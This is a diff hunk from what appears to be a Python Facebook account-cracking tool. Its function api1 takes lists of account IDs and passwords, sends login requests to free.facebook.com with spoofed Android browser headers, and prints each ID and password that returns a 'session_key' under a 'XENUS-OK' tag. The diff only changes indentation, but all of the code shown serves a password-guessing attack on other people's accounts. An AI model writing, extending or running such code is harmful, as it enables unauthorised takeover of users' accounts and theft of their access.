@@ -331,8 +331,8 @@ def api1(ids,names,passlist):
                                    'upgrade-insecure-requests': '1',
                                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                                     'viewport-width': '980',
-}
-                        url = 'free.facebook.com'
+                                 }
+                       url = 'free.facebook.com'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
                                         print(f'\r\r{G}[{G}XENUS-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
